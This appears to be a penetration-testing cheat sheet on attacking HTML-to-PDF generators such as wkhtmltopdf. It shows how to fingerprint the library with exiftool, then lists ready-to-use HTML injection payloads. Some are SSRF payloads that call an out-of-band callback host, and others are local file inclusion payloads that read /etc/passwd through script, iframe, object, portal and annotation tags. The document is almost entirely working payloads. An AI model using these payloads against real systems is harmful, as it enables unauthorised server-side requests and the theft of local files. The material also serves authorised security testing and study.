## PDF Generation Vulnerabilities

#### Determining the PDF Generation Library

```bash
$ exiftool invoice.pdf 
<SNIP>
Creator                         : wkhtmltopdf 0.12.6.1
Producer                        : Qt 4.8.7
<SNIP>
```

#### Server-Side Request Forgery (SSRF) Payloads 

```html
<img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
<link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2">
<iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>
```

#### Local File Inclusion (LFI) Payloads 

```html
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(this.responseText)
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>

<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">

<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
```
